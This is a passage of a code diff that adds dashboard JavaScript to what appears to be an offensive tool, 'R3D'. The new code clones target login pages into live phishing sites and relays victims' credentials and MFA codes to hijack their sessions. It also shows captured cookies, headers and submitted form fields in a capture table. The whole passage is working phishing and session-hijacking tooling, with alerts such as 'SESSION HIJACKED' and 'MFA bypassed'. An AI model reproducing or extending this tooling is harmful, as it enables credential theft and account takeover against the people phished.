         <div style="font-size:10px;color:var(--txt-dim)">Target: ${esc(msg.targetUrl||'')} | ${esc(fields)} | ${esc(msg.captureType||'')} | ${msg.ts||''}</div>
       </div>`;
       setTimeout(()=>{if(bl)bl.innerHTML=''},20000);
+      const phishPanel=document.getElementById('panel-phish');
+      if(phishPanel&&phishPanel.classList.contains('active')) loadPhishDashboard();
     }
     if(msg.type==='phish_cloned'){
       const ctl=document.getElementById('phish-ctl-'+msg.targetUrl?.replace(/^https?:\/\//,'').split('/')[0]);
+      const serveUrl=location.origin+(msg.serveUrl||'');
       if(ctl){
-        const serveUrl=location.origin+(msg.serveUrl||'');
         ctl.innerHTML=`<a href="${msg.serveUrl||''}" target="_blank" style="font-size:9px;font-weight:700;color:var(--red);text-decoration:none;padding:2px 6px;border:1px solid var(--red);border-radius:3px;opacity:.9" onmouseover="this.style.opacity='1'" onmouseout="this.style.opacity='.9'">PHISH LIVE</a>`
           +`<button onclick="copyToClipboard(this,'${serveUrl}')" style="font-size:9px;font-weight:600;color:var(--txt);padding:2px 6px;border:1px solid var(--border);border-radius:3px;background:var(--bg3);cursor:pointer">Copy Link</button>`;
       }
+      const bl3=document.getElementById('beacon-log')||(()=>{const c=document.createElement('div');c.id='beacon-log';c.style.cssText='position:fixed;bottom:12px;right:12px;max-width:440px;z-index:9999';document.body.appendChild(c);return c})();
+      bl3.innerHTML=`<div style="background:var(--bg2);border:2px solid var(--green);border-radius:8px;padding:14px 18px;box-shadow:0 4px 24px rgba(0,0,0,.6);animation:fadeIn .3s">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px">
+          <span style="width:8px;height:8px;border-radius:50%;background:var(--green);animation:pulse 2s infinite"></span>
+          <span style="font-size:12px;font-weight:900;color:var(--green)">PHISH PAGE LIVE</span>
+        </div>
+        <div style="font-size:10px;color:var(--txt-dim);margin-bottom:10px">Target: ${esc(msg.targetUrl||'')}</div>
+        <div style="display:flex;gap:8px;align-items:center">
+          <a href="${esc(msg.serveUrl||'')}" target="_blank" style="flex:1;font-size:11px;font-weight:700;color:var(--green);font-family:var(--mono);text-decoration:none;background:rgba(105,240,174,.08);padding:6px 10px;border:1px solid rgba(105,240,174,.3);border-radius:5px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:block;transition:all .15s" onmouseover="this.style.background='rgba(105,240,174,.18)';this.style.textDecoration='underline'" onmouseout="this.style.background='rgba(105,240,174,.08)';this.style.textDecoration='none'">${esc(serveUrl.replace(/^https?:\/\//,'').substring(0,55))}</a>
+          <button onclick="copyToClipboard(this,'${serveUrl}')" style="font-size:10px;font-weight:700;padding:6px 12px;background:var(--bg3);border:1px solid var(--green);color:var(--green);border-radius:5px;cursor:pointer;white-space:nowrap">Copy Link</button>
+        </div>
+      </div>`;
+      setTimeout(()=>{if(bl3)bl3.innerHTML=''},25000);
+      const phishPanel2=document.getElementById('panel-phish');
+      if(phishPanel2&&phishPanel2.classList.contains('active')) loadPhishDashboard();
+    }
+    if(msg.type==='phish_relay_success'){
+      const bl=document.getElementById('beacon-log')||(()=>{const c=document.createElement('div');c.id='beacon-log';c.style.cssText='position:fixed;bottom:12px;right:12px;max-width:420px;z-index:9999';document.body.appendChild(c);return c})();
+      bl.innerHTML=`<div style="background:var(--bg2);border:2px solid var(--green);border-radius:6px;padding:12px 16px;margin-top:6px;box-shadow:0 4px 20px rgba(0,0,0,.5);animation:fadeIn .3s">
+        <div style="font-size:12px;font-weight:900;color:var(--green);margin-bottom:6px">SESSION HIJACKED \u2014 CREDENTIALS RELAYED</div>
+        <div style="font-size:10px;color:var(--txt-dim)">Target: ${esc(msg.targetUrl||'')} | ${msg.cookieCount||0} cookies captured | ${msg.mfaRelayed?'MFA bypassed':'Direct login'}</div>
+      </div>`;
+      setTimeout(()=>{if(bl)bl.innerHTML=''},25000);
+      const pp=document.getElementById('panel-phish');
+      if(pp&&pp.classList.contains('active')) loadPhishDashboard();
+    }
+    if(msg.type==='phish_relay_mfa_needed'){
+      const bl=document.getElementById('beacon-log')||(()=>{const c=document.createElement('div');c.id='beacon-log';c.style.cssText='position:fixed;bottom:12px;right:12px;max-width:420px;z-index:9999';document.body.appendChild(c);return c})();
+      bl.innerHTML=`<div style="background:var(--bg2);border:2px solid var(--yellow);border-radius:6px;padding:12px 16px;margin-top:6px;box-shadow:0 4px 20px rgba(0,0,0,.5);animation:fadeIn .3s">
+        <div style="font-size:11px;font-weight:900;color:var(--yellow);margin-bottom:4px">MFA REQUIRED \u2014 WAITING FOR VICTIM CODE</div>
+        <div style="font-size:10px;color:var(--txt-dim)">Credentials relayed. Waiting for victim to enter MFA code...</div>
+      </div>`;
+      setTimeout(()=>{if(bl)bl.innerHTML=''},30000);
+      const pp2=document.getElementById('panel-phish');
+      if(pp2&&pp2.classList.contains('active')) loadPhishDashboard();
+    }
+    if(msg.type==='phish_relay_failed'){
+      const bl=document.getElementById('beacon-log')||(()=>{const c=document.createElement('div');c.id='beacon-log';c.style.cssText='position:fixed;bottom:12px;right:12px;max-width:420px;z-index:9999';document.body.appendChild(c);return c})();
+      bl.innerHTML=`<div style="background:var(--bg2);border:2px solid var(--red);border-radius:6px;padding:12px 16px;margin-top:6px;box-shadow:0 4px 20px rgba(0,0,0,.5);animation:fadeIn .3s">
+        <div style="font-size:11px;font-weight:900;color:var(--red);margin-bottom:4px">RELAY FAILED</div>
+        <div style="font-size:10px;color:var(--txt-dim)">${esc(msg.error||'Login rejected or blocked')}</div>
+      </div>`;
+      setTimeout(()=>{if(bl)bl.innerHTML=''},15000);
     }
     if(msg.type==='pivot_progress'&&msg.sessionId===activeSession){
       const el=document.getElementById('pivot-results');
@@ -3488,6 +3882,394 @@ function _handleSSE(e){
 
 // Fallback: poll session list every 30s in case SSE drops
 setInterval(()=>{if(!sseConnected)loadSessions()},30000);
+
+// ─── System Deep-Dive Modal ──────────────────────────────────────────
+
+let _sysModalKeyHandler = null;
+
+window.openSystemModal = function(systemId) {
+  const sys = _systemsMap[systemId];
+  if (!sys) return;
+
+  const domain = (sys.domains || [])[0] || '';
+  const sysFindings = (window._lastLoadedEvents || [])
+    .filter(e => e.type === 'finding' && e.data?.systemId === systemId)
+    .map(e => e.data);
+
+  const sevCounts = { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0, INFO: 0 };
+  sysFindings.forEach(f => { if (sevCounts[f.severity] !== undefined) sevCounts[f.severity]++; });
+
+  const overlay = document.createElement('div');
+  overlay.className = 'sys-modal-overlay';
+  overlay.innerHTML = `<div class="sys-modal" onclick="event.stopPropagation()">
+    <div class="sys-modal-head">
+      <h3>${esc(sys.name || sys.id)}</h3>
+      ${domain ? `<span class="sys-modal-domain">${esc(domain)}</span>` : ''}
+      <button class="sys-modal-close" onclick="closeSysModal()">&times;</button>
+    </div>
+    <div class="sys-modal-tabs">
+      <button class="smt active" data-smt="overview">Overview</button>
+      <button class="smt" data-smt="findings">Findings (${sysFindings.length})</button>
+      <button class="smt" data-smt="endpoints">Endpoints</button>
+      <button class="smt" data-smt="headers">Headers</button>
+      <button class="smt" data-smt="attack">Attack Surface</button>
+    </div>
+    <div class="sys-modal-body">
+      <div class="smp active" id="smp-overview">${_smOverview(sys, sysFindings, sevCounts, domain)}</div>
+      <div class="smp" id="smp-findings">${_smFindings(sysFindings)}</div>
+      <div class="smp" id="smp-endpoints">${_smEndpoints(sys)}</div>
+      <div class="smp" id="smp-headers"><div style="color:var(--txt-dim);text-align:center;padding:20px">Loading headers...</div></div>
+      <div class="smp" id="smp-attack">${_smAttack(sys, domain)}</div>
+    </div>
+  </div>`;
+
+  overlay.addEventListener('click', (e) => { if (e.target === overlay) closeSysModal(); });
+  document.body.appendChild(overlay);
+
+  overlay.querySelectorAll('.smt').forEach(tab => {
+    tab.addEventListener('click', () => {
+      overlay.querySelectorAll('.smt').forEach(t => t.classList.remove('active'));
+      overlay.querySelectorAll('.smp').forEach(p => p.classList.remove('active'));
+      tab.classList.add('active');
+      const panel = overlay.querySelector('#smp-' + tab.dataset.smt);
+      if (panel) panel.classList.add('active');
+      if (tab.dataset.smt === 'headers') _smLoadHeaders(overlay, domain);
+    });
+  });
+
+  _sysModalKeyHandler = (e) => { if (e.key === 'Escape') closeSysModal(); };
+  document.addEventListener('keydown', _sysModalKeyHandler);
+};
+
+window.closeSysModal = function() {
+  const overlay = document.querySelector('.sys-modal-overlay');
+  if (overlay) overlay.remove();
+  if (_sysModalKeyHandler) {
+    document.removeEventListener('keydown', _sysModalKeyHandler);
+    _sysModalKeyHandler = null;
+  }
+};
+
+function _smOverview(sys, findings, sevCounts, domain) {
+  const methods = (sys.methods || []).join(', ') || 'N/A';
+  const domains = (sys.domains || []).map(d => `<span class="sys-modal-domain" style="margin:0 2px">${esc(d)}</span>`).join(' ');
+  const urls = (sys.sampleUrls || []).length;
+
+  return `<div class="sm-stat-grid">
+    <div class="sm-stat"><div class="sm-stat-val" style="color:var(--orange)">${findings.length}</div><div class="sm-stat-lbl">Findings</div></div>
+    <div class="sm-stat"><div class="sm-stat-val" style="color:var(--txt)">${sys.requests || 0}</div><div class="sm-stat-lbl">Requests</div></div>
+    <div class="sm-stat"><div class="sm-stat-val" style="color:var(--accent)">${urls}</div><div class="sm-stat-lbl">URLs Observed</div></div>
+    <div class="sm-stat"><div class="sm-stat-val" style="color:var(--red)">${sevCounts.CRITICAL + sevCounts.HIGH}</div><div class="sm-stat-lbl">Critical + High</div></div>
+  </div>
+  <div class="sm-section">
+    <div class="sm-section-title">Severity Breakdown</div>
+    <div style="display:flex;gap:8px;flex-wrap:wrap">
+      ${['CRITICAL','HIGH','MEDIUM','LOW','INFO'].map(s => {
+        const c = s==='CRITICAL'?'var(--red)':s==='HIGH'?'var(--orange)':s==='MEDIUM'?'var(--yellow)':s==='LOW'?'var(--accent)':'var(--green)';
+        return `<span style="font-family:var(--mono);font-size:11px;font-weight:700;color:${c}">${sevCounts[s]} ${s}</span>`;
+      }).join('')}
+    </div>
+  </div>
+  <div class="sm-section">
+    <div class="sm-section-title">Domains</div>
+    <div>${domains || '<span style="color:var(--txt-dim)">None</span>'}</div>
+  </div>
+  <div class="sm-section">
+    <div class="sm-section-title">HTTP Methods</div>
+    <div style="display:flex;gap:6px;flex-wrap:wrap">${(sys.methods||[]).map(m => `<span class="sm-method-badge sm-method-${m}">${m}</span>`).join('') || '<span style="color:var(--txt-dim)">None observed</span>'}</div>
+  </div>
+  <div class="sm-section">
+    <div class="sm-section-title">AI Risk Assessment</div>
+    <div id="sm-ai-risk" style="color:var(--txt-dim);font-size:11px">
+      <button class="btn btn-sm btn-primary" onclick="analyzeSystem('${esc(sys.id)}','${esc(sys.name)}',${findings.length},${sys.requests||0},this)">Generate Assessment</button>
+    </div>
+  </div>`;
+}
+
+function _smFindings(findings) {
+  if (!findings.length) return '<div style="color:var(--txt-dim);text-align:center;padding:20px">No findings for this system.</div>';
+  const SEV_W = { CRITICAL: 5, HIGH: 4, MEDIUM: 3, LOW: 2, INFO: 1 };
+  const sorted = [...findings].sort((a, b) => (SEV_W[b.severity] || 0) - (SEV_W[a.severity] || 0));
+  return sorted.map(f => {
+    const st = f.status || 'likely';
+    const stCls = st === 'confirmed' ? 'status-confirmed' : st === 'likely' ? 'status-likely' : 'status-hypothesis';
+    return `<div class="finding-item" style="cursor:default">
+      <span class="sev-dot sev-${f.severity || 'INFO'}"></span>
+      <span class="finding-title" style="flex:1">${esc(f.title || 'Untitled')}</span>
+      <span class="finding-status ${stCls}">${esc(st)}</span>
+      ${f.cwe ? `<span style="font-size:9px;color:var(--txt-dim);font-family:var(--mono);flex-shrink:0">${esc(f.cwe)}</span>` : ''}
+      <span class="finding-meta">${esc(f.severity || '?')}</span>
+    </div>`;
+  }).join('');
+}
+
+function _smEndpoints(sys) {
+  const urls = sys.sampleUrls || [];
+  if (!urls.length) return '<div style="color:var(--txt-dim);text-align:center;padding:20px">No endpoints discovered. Browse the target to capture URLs.</div>';
+
+  const pathMap = new Map();
+  for (const u of urls) {
+    try {
+      const parsed = new URL(u);
+      const path = parsed.pathname.replace(/\/[0-9a-f]{8,}|\/\d+/g, '/{id}');
+      if (!pathMap.has(path)) pathMap.set(path, { path, fullUrls: [], methods: new Set() });
+      pathMap.get(path).fullUrls.push(u);
+    } catch {}
+  }
+
+  const groups = [...pathMap.values()].sort((a, b) => a.path.localeCompare(b.path));
+  return `<div class="sm-section-title">${groups.length} unique endpoint pattern${groups.length !== 1 ? 's' : ''} from ${urls.length} URLs</div>`
+    + groups.map(g => {
+      return `<div class="sm-endpoint-row">
+        <span style="font-family:var(--mono);color:var(--txt-br);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(g.fullUrls[0])}">${esc(g.path)}</span>
+        <span style="font-size:9px;color:var(--txt-dim)">${g.fullUrls.length} hit${g.fullUrls.length > 1 ? 's' : ''}</span>
+      </div>`;
+    }).join('');
+}
+
+async function _smLoadHeaders(overlay, domain) {
+  const panel = overlay.querySelector('#smp-headers');
+  if (!panel || !domain) { if (panel) panel.innerHTML = '<div style="color:var(--txt-dim);text-align:center;padding:20px">No domain to scan.</div>'; return; }
+  if (panel.dataset.loaded) return;
+  panel.dataset.loaded = '1';
+
+  const important = ['Content-Security-Policy', 'Strict-Transport-Security', 'X-Content-Type-Options', 'X-Frame-Options', 'Referrer-Policy', 'Permissions-Policy'];
+  let html = '';
+
+  try {
+    const url = 'https://' + domain;
+    const [headersResp, corsResp] = await Promise.all([
+      fetch('/r3d/prove?test=headers&url=' + encodeURIComponent(url), { headers: authHeaders() }),
+      fetch('/r3d/prove?test=cors&url=' + encodeURIComponent(url), { headers: authHeaders() }),
+    ]);
+    const headersHtml = await headersResp.text();
+    const corsHtml = await corsResp.text();
+
+    html += `<div class="sm-section">
+      <div class="sm-section-title">Security Headers</div>
+      <iframe srcdoc="${headersHtml.replace(/"/g, '&quot;')}" style="width:100%;border:1px solid var(--border);border-radius:6px;min-height:300px;background:var(--bg2)"></iframe>
+    </div>
+    <div class="sm-section">
+      <div class="sm-section-title">CORS Configuration</div>
+      <iframe srcdoc="${corsHtml.replace(/"/g, '&quot;')}" style="width:100%;border:1px solid var(--border);border-radius:6px;min-height:200px;background:var(--bg2)"></iframe>
+    </div>`;
+  } catch (e) {
+    html = `<div style="color:var(--red);padding:20px">Failed to load headers: ${esc(e.message)}</div>`;
+  }
+
+  panel.innerHTML = html;
+}
+
+function _smAttack(sys, domain) {
+  const origin = domain ? 'https://' + domain : '';
+  return `<div class="sm-section">
+    <div class="sm-section-title">Quick Actions</div>
+    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px">
+      ${domain ? `<button class="sm-attack-btn" style="background:rgba(255,23,68,.1);border:1px solid var(--red);color:var(--red)" onclick="closeSysModal();openPhishPicker('${esc(sys.id)}','${esc(domain)}')">Phish</button>` : ''}
+      ${domain ? `<a href="/r3d/prove?test=headers&url=${encodeURIComponent('https://'+domain)}" target="_blank" class="sm-attack-btn" style="background:rgba(0,229,255,.08);border:1px solid var(--accent);color:var(--accent);text-decoration:none">Header Audit</a>` : ''}
+      ${domain ? `<a href="/r3d/prove?test=cors&url=${encodeURIComponent('https://'+domain)}" target="_blank" class="sm-attack-btn" style="background:rgba(179,136,255,.08);border:1px solid var(--purple);color:var(--purple);text-decoration:none">CORS Test</a>` : ''}
+      <button class="sm-attack-btn" style="background:rgba(255,234,0,.08);border:1px solid var(--yellow);color:var(--yellow)" onclick="closeSysModal();explainSystem('${esc(sys.id)}','${esc(sys.name)}')">AI Explain</button>
+    </div>
+  </div>
+  <div class="sm-section">
+    <div class="sm-section-title">Auth Context</div>
+    <div id="sm-auth-ctx" style="color:var(--txt-dim);font-size:11px">${origin ? `<button class="btn btn-sm" onclick="_smLoadAuthCtx('${esc(origin)}')">Load Auth Context</button>` : 'No origin available'}</div>
+  </div>
+  <div class="sm-section">
+    <div class="sm-section-title">Observed URLs (sample)</div>
+    <div style="max-height:200px;overflow-y:auto">${(sys.sampleUrls || []).slice(0, 20).map(u =>
+      `<div style="font-size:10px;font-family:var(--mono);color:var(--txt-dim);padding:2px 0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(u)}">${esc(u)}</div>`
+    ).join('') || '<span style="color:var(--txt-dim)">None</span>'}</div>
+  </div>`;
+}
+
+window._smLoadAuthCtx = async function(origin) {
+  const el = document.getElementById('sm-auth-ctx');
+  if (!el) return;
+  el.innerHTML = 'Loading...';
+  try {
+    const r = await fetch('/r3d/auth-context/' + encodeURIComponent(origin), { headers: authHeaders() });
+    const data = await r.json();
+    const ctx = data.context || {};
+    if (!ctx.cookies && !ctx.headers) {
+      el.innerHTML = '<span style="color:var(--txt-dim)">No auth context captured for this origin.</span>';
+      return;
+    }
+    let html = '';
+    if (ctx.cookies) html += `<div style="margin-bottom:8px"><strong style="color:var(--txt)">Cookies:</strong><pre style="font-size:10px;color:var(--orange);white-space:pre-wrap;word-break:break-all;max-height:80px;overflow:auto;margin:4px 0;padding:4px;background:var(--bg3);border-radius:4px">${esc(ctx.cookies)}</pre></div>`;
+    if (ctx.headers) html += `<div style="margin-bottom:8px"><strong style="color:var(--txt)">Headers:</strong><pre style="font-size:10px;color:var(--accent);white-space:pre-wrap;word-break:break-all;max-height:80px;overflow:auto;margin:4px 0;padding:4px;background:var(--bg3);border-radius:4px">${esc(JSON.stringify(ctx.headers, null, 2))}</pre></div>`;
+    if (ctx.userAgent) html += `<div><strong style="color:var(--txt)">User-Agent:</strong> <span style="font-size:10px;color:var(--txt-dim)">${esc(ctx.userAgent)}</span></div>`;
+    if (ctx.ts) html += `<div style="margin-top:4px;font-size:9px;color:var(--txt-dim)">Captured: ${esc(ctx.ts)}</div>`;
+    el.innerHTML = html;
+  } catch (e) {
+    el.innerHTML = `<span style="color:var(--red)">Error: ${esc(e.message)}</span>`;
+  }
+};
+
+// ─── Phish Dashboard Panel ───────────────────────────────────────────
+
+let _phishDashRefresh = null;
+
+async function loadPhishDashboard() {
+  const root = document.getElementById('phish-dashboard-root');
+  if (!root) return;
+  root.innerHTML = '<div style="color:var(--txt-dim);text-align:center;padding:24px">Loading\u2026</div>';
+  try {
+    const r = await fetch('/r3d/attack/phish/sites', { headers: authHeaders() });
+    const data = await r.json();
+    if (!data.ok) { root.innerHTML = '<div style="color:var(--red);padding:24px;text-align:center">Failed to load phish sites.</div>'; return; }
+    renderPhishDashboard(root, data.sites || []);
+  } catch (e) {
+    root.innerHTML = '<div style="color:var(--red);padding:24px;text-align:center">Error: ' + esc(e.message) + '</div>';
+  }
+  if (_phishDashRefresh) clearInterval(_phishDashRefresh);
+  _phishDashRefresh = setInterval(() => {
+    const panel = document.getElementById('panel-phish');
+    if (panel && panel.classList.contains('active')) loadPhishDashboard();
+  }, 15000);
+}
+
+function _relayStatusStyle(status) {
+  switch (status) {
+    case 'armed': return 'background:rgba(179,136,255,.15);color:var(--purple)';
+    case 'waiting_for_mfa': return 'background:rgba(255,234,0,.15);color:var(--yellow);animation:pulse 2s infinite';
+    case 'session_hijacked': return 'background:rgba(105,240,174,.15);color:var(--green)';
+    case 'failed': return 'background:rgba(255,23,68,.1);color:var(--red)';
+    default: return 'background:rgba(102,102,128,.1);color:var(--txt-dim)';
+  }
+}
+
+function _relayStatusLabel(status) {
+  switch (status) {
+    case 'armed': return 'RELAY ARMED';
+    case 'waiting_for_mfa': return 'WAITING FOR MFA';
+    case 'session_hijacked': return 'SESSION HIJACKED';
+    case 'failed': return 'RELAY FAILED';
+    default: return 'RELAY OFF';
+  }
+}
+
+window.togglePhishRelay = async function(siteId, targetUrl) {
+  try {
+    const r = await fetch(`/r3d/attack/phish/${siteId}`, { headers: authHeaders() });
+    const data = await r.json();
+    const currentlyEnabled = data?.relay?.enabled || false;
+    const resp = await fetch(`/r3d/attack/phish/${siteId}/relay`, {
+      method: 'POST',
+      headers: authHeaders({ 'Content-Type': 'application/json' }),
+      body: JSON.stringify({ enabled: !currentlyEnabled, loginUrl: targetUrl }),
+    });
+    const result = await resp.json();
+    if (result.ok) loadPhishDashboard();
+  } catch (e) {
+    console.error('Failed to toggle relay', e);
+  }
+};
+
+function renderPhishDashboard(root, sites) {
+  if (!sites.length) {
+    root.innerHTML = `<div style="text-align:center;padding:40px 20px;color:var(--txt-dim)">
+      <div style="font-size:18px;font-weight:700;color:var(--txt);margin-bottom:8px">No Active Phish Sites</div>
+      <div style="font-size:12px;max-width:360px;margin:0 auto;line-height:1.6">Use the <strong style="color:var(--red)">Phish This Page</strong> button in the R3D extension, or click <strong>PHISH</strong> on a system card to start cloning.</div>
+    </div>`;
+    return;
+  }
+
+  let html = '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:12px">';
+  for (const site of sites) {
+    const target = site.targetUrl || '';
+    const shortTarget = target.replace(/^https?:\/\//, '').substring(0, 80);
+    const serveUrl = location.origin + (site.serveUrl || `/p/${site.siteId}/`);
+    const caps = site.captureCount || 0;
+    const clonedAt = site.clonedAt ? fmtDate(site.clonedAt) : 'Unknown';
+
+    html += `<div class="phish-dash-card" data-site-id="${esc(site.siteId)}">
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px">
+        <span style="width:8px;height:8px;border-radius:50%;background:var(--green);flex-shrink:0;animation:pulse 2s infinite"></span>
+        <span style="font-weight:700;font-size:13px;color:var(--txt-br);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(target)}">${esc(shortTarget)}</span>
+      </div>
+      <a href="${esc(serveUrl)}" target="_blank" style="display:flex;align-items:center;gap:8px;padding:6px 10px;margin-bottom:8px;background:rgba(105,240,174,.06);border:1px solid rgba(105,240,174,.2);border-radius:5px;text-decoration:none;transition:all .15s;cursor:pointer" onmouseover="this.style.background='rgba(105,240,174,.15)';this.style.borderColor='var(--green)'" onmouseout="this.style.background='rgba(105,240,174,.06)';this.style.borderColor='rgba(105,240,174,.2)'">
+        <span style="width:6px;height:6px;border-radius:50%;background:var(--green);flex-shrink:0"></span>
+        <span style="font-size:11px;font-weight:700;color:var(--green);font-family:var(--mono);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1">${esc(serveUrl.replace(/^https?:\/\//, '').substring(0, 55))}</span>
+        <span style="font-size:9px;color:var(--txt-dim);flex-shrink:0">Open \u2197</span>
+      </a>
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
+        <span style="font-size:9px;color:var(--txt-dim);font-family:var(--mono)">${clonedAt}</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:12px;margin-bottom:8px">
+        <span style="font-family:var(--mono);font-weight:900;font-size:20px;color:${caps > 0 ? 'var(--red)' : 'var(--txt-dim)'}">${caps}</span>
+        <span style="font-size:10px;color:var(--txt-dim)">credential capture${caps !== 1 ? 's' : ''}</span>
+        ${caps > 0 ? '<span style="font-size:9px;font-weight:800;color:var(--red);font-family:var(--mono);animation:pulse 2s infinite">LIVE</span>' : ''}
+      </div>
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px">
+        <span style="font-size:9px;font-weight:800;font-family:var(--mono);text-transform:uppercase;letter-spacing:.5px;padding:2px 8px;border-radius:10px;${_relayStatusStyle(site.relay?.status || 'off')}" id="relay-status-${esc(site.siteId)}">${_relayStatusLabel(site.relay?.status || 'off')}</span>
+        <button onclick="togglePhishRelay('${esc(site.siteId)}','${esc(target)}')" style="font-size:9px;padding:3px 8px;background:${site.relay?.enabled ? 'rgba(255,23,68,.1)' : 'rgba(179,136,255,.08)'};border:1px solid ${site.relay?.enabled ? 'var(--red)' : 'var(--purple)'};color:${site.relay?.enabled ? 'var(--red)' : 'var(--purple)'};border-radius:4px;cursor:pointer;font-weight:700">${site.relay?.enabled ? 'Disarm Relay' : 'Arm Relay'}</button>
+      </div>
+      <div style="display:flex;gap:6px;flex-wrap:wrap">
+        <button onclick="copyToClipboard(this,'${serveUrl}')" style="font-size:10px;padding:4px 10px;background:var(--bg3);border:1px solid var(--border);color:var(--txt);border-radius:4px;cursor:pointer;font-weight:600">Copy Link</button>
+        <a href="${esc(serveUrl)}" target="_blank" style="font-size:10px;padding:4px 10px;background:rgba(0,229,255,.08);border:1px solid var(--accent);color:var(--accent);border-radius:4px;cursor:pointer;font-weight:600;text-decoration:none">Open</a>
+        <button onclick="viewPhishCaptures('${esc(site.siteId)}')" style="font-size:10px;padding:4px 10px;background:rgba(255,23,68,.08);border:1px solid var(--red);color:var(--red);border-radius:4px;cursor:pointer;font-weight:600">${caps} Captures</button>
+        <button onclick="deletePhishSite('${esc(site.siteId)}')" style="font-size:10px;padding:4px 10px;background:transparent;border:1px solid var(--border);color:var(--txt-dim);border-radius:4px;cursor:pointer;font-weight:600">Delete</button>
+      </div>
+    </div>`;
+  }
+  html += '</div>';
+  root.innerHTML = html;
+}
+
+window.viewPhishCaptures = async function(siteId) {
+  try {
+    const r = await fetch(`/r3d/attack/phish/${siteId}`, { headers: authHeaders() });
+    const data = await r.json();
+    if (!data.ok) return;
+    const captures = data.captured || [];
+    const root = document.getElementById('phish-dashboard-root');
+    if (!root) return;
+    let html = `<div style="margin-bottom:12px">
+      <button onclick="loadPhishDashboard()" style="font-size:10px;padding:4px 10px;background:var(--bg3);border:1px solid var(--border);color:var(--accent);border-radius:4px;cursor:pointer;font-weight:600">\u2190 Back to Sites</button>
+      <span style="font-size:13px;font-weight:700;color:var(--txt-br);margin-left:12px">${esc(data.targetUrl || siteId)}</span>
+      <span style="font-size:10px;color:var(--txt-dim);margin-left:8px">${captures.length} capture${captures.length !== 1 ? 's' : ''}</span>
+    </div>`;
+    if (!captures.length) {
+      html += '<div style="color:var(--txt-dim);text-align:center;padding:24px">No credentials captured yet. Share the phish link and wait for submissions.</div>';
+    } else {
+      html += '<table style="width:100%;border-collapse:collapse;font-size:11px"><thead><tr style="text-align:left;border-bottom:2px solid var(--border)">';
+      html += '<th style="padding:6px 8px;color:var(--txt-dim);font-weight:700">Time</th>';
+      html += '<th style="padding:6px 8px;color:var(--txt-dim);font-weight:700">Type</th>';
+      html += '<th style="padding:6px 8px;color:var(--txt-dim);font-weight:700">Fields</th>';
+      html += '<th style="padding:6px 8px;color:var(--txt-dim);font-weight:700">Data</th>';
+      html += '</tr></thead><tbody>';
+      for (const cap of captures.slice().reverse()) {
+        const ts = cap.ts ? new Date(cap.ts).toLocaleString() : '';
+        const type = cap.t || 'form';
+        const fields = cap.fields || {};
+        const fieldKeys = Object.keys(fields);
+        const preview = fieldKeys.map(k => `${esc(k)}: ${esc(String(fields[k]).substring(0, 40))}`).join(', ');
+        html += `<tr style="border-bottom:1px solid var(--border)">
+          <td style="padding:6px 8px;color:var(--txt-dim);font-family:var(--mono);font-size:10px;white-space:nowrap">${ts}</td>
+          <td style="padding:6px 8px"><span style="font-weight:800;color:var(--red);font-family:var(--mono);text-transform:uppercase;font-size:9px">${esc(type)}</span></td>
+          <td style="padding:6px 8px;color:var(--txt);font-family:var(--mono)">${fieldKeys.length}</td>
+          <td style="padding:6px 8px;color:var(--orange);font-family:var(--mono);font-size:10px;max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(preview)}">${esc(preview) || '<span style="color:var(--txt-dim)">-</span>'}</td>
+        </tr>`;
+      }
+      html += '</tbody></table>';
+    }
+    root.innerHTML = html;
+  } catch (e) {
+    console.error('Failed to load captures', e);
+  }
+};
+
+window.deletePhishSite = async function(siteId) {
+  if (!confirm('Delete this phish site?')) return;
+  try {
+    await fetch(`/r3d/attack/phish/${siteId}`, { method: 'DELETE', headers: authHeaders() });
+    const card = document.querySelector(`.phish-dash-card[data-site-id="${siteId}"]`);
+    if (card) card.remove();
+  } catch (e) {
+    console.error('Failed to delete phish site', e);
+  }
+};
 
 // ─── API Specs Panel ─────────────────────────────────────────────────
 
